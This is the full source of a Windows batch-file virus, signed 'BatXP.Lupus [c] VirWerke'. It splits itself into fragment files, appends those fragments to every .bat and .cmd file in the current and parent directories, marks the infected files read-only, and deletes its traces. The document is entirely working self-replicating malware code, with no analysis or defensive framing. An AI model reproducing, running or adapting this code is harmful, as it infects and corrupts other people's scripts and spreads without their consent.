   ::
   set Ruru=find
   @goto Lup1
   ::
   :Lup1 %Homo%
   %Homo%@echo off
   %Homo%set Urur=copy
   %Ruru% "Homo"<%0>Lup1.lps
   %Homo%echo ::>Lps1.lps
   %Homo%echo set Ruru=find>>Lps1.lps
   %Homo%echo @goto Lup1>>Lps1.lps
   %Homo%echo ::>Lps2.lps
   %Homo%echo ::>Lps3.lps
   %Homo%echo :Lup5>>Lps3.lps
   %Homo%echo cls>>Lps3.lps
   %Homo%@goto Lup2
   ::
   :Lup2 %Homini%
   %Ruru% "Homini"<%0>Lup2.lps
   %Homini%attrib +r %0>nul
   %Homini%%Urur% *.bat *.bat.brt>nul
   %Homini%%Urur% ..\\*.bat ..\\*.bat.brt>nul
   %Homini%%Urur% *.cmd *.cmd.brt>nul
   %Homini%%Urur% ..\\*.cmd ..\\*.cmd.brt>nul
   %Homini%%Urur% Lps2.lps+Lup1.lps Pus1.lps>nul
   %Homini%%Urur% Lps2.lps+Lup2.lps Pus2.lps>nul
   %Homini%for %%q in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%q"+Lps1.lps "%%q">nul
   %Homini%for %%w in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%w"+"%%w.brt" "%%w">nul
   %Homini%for %%e in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%e"+Pus1.lps "%%e">nul
   %Homini%for %%r in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%r"+"%%r.brt" "%%r">nul
   %Homini%@goto Lup3
   ::
   :Lup3 %Lupus%
   %Ruru% "Lupus"<%0>Lup3.lps
   %Lupus%%Urur% Lps2.lps+Lup3.lps Pus3.lps>nul
   %Lupus%for %%t in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%t"+Pus2.lps "%%t">nul
   %Lupus%for %%y in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%y"+"%%y.brt" "%%y">nul
   %Lupus%for %%o in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%o"+Pus3.lps "%%o">nul
   %Lupus%for %%p in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%p"+"%%p.brt" "%%p">nul
   %Lupus%@goto Lup4
   :: BatXP.Lupus [c] VirWerke
   ::
   :Lup4 %Est%
   %Ruru% "Est"<%0>Lup4.lps
   %Est%%Urur% Lps2.lps+Lup4.lps Pus4.lps>nul
   %Est%for %%a in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%a"+Pus4.lps "%%a">nul
   %Est%for %%s in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%s"+"%%s.brt" "%%s">nul
   %Est%for %%d in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Urur% "%%d"+Lps3.lps "%%d">nul
   %Est%for %%f in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do attrib +r "%%f">nul
   %Est%for %%g in (*.lps) do del %%g>nul
   %Est%for %%h in (*.brt, ..\\*.brt) do del "%%h">nul
   %Est%@goto Lup5
   ::
   :Lup5
   cls
